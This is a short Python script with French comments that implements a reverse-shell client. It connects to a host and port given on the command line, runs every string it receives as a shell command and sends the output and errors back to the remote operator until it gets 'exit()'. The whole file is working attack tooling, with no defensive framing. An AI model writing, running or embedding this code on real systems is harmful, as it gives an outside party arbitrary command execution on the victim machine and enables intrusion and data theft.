# coding=utf-8
import socket
import subprocess as sp
import sys
# on importe les librairie
host = str(sys.argv[1])
port = int(sys.argv[2])
# definition hots et port en attente d'argument
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host, port))
# initialitation connection
while 1:
    command = str(conn.recv(1024))
# boucle vraie connection limit 1024bit
    if command != "exit()":
        sh = sp.Popen(command, shell=True,
                      stdout=sp.PIPE,
                      stderr=sp.PIPE,
                      stdin=sp.PIPE,)
# si commande non equal a exit
# création des entre en commande shell
        out, err = sh.communicate()
        result = str(out) + str(err)
# capture des sortie et erreur
        length = str(len(result)).zfill(16)
# on calcul la longeur pour aidez le serveur a recuperer les donné formate et traiter en 16 bit
        conn.send(length + result)
    else:
        break
conn.close()
